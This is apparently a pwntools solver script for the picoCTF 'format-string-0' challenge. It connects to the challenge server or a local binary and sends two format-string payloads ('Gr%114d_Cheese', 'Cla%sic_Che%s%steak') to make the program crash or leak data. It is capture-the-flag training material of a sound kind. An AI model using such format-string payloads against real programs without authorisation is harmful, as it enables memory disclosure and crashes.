#!/usr/bin/python3
from pwn import *
import warnings
import os

#run python -m venv my-venv
#cd my-venv
#source my-venv/bin/activate

warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/home/ubuntu/Documents/CTF/picoCTF/formatstring/format-string-0' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
  
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else 'mimas.picoctf.net'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 56351
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

r.recvuntil("Enter your recommendation: ")
r.sendline("Gr%114d_Cheese")
r.recvuntil("Enter your recommendation: ")
r.sendline("Cla%sic_Che%s%steak")

x = r.recv()
print(x)
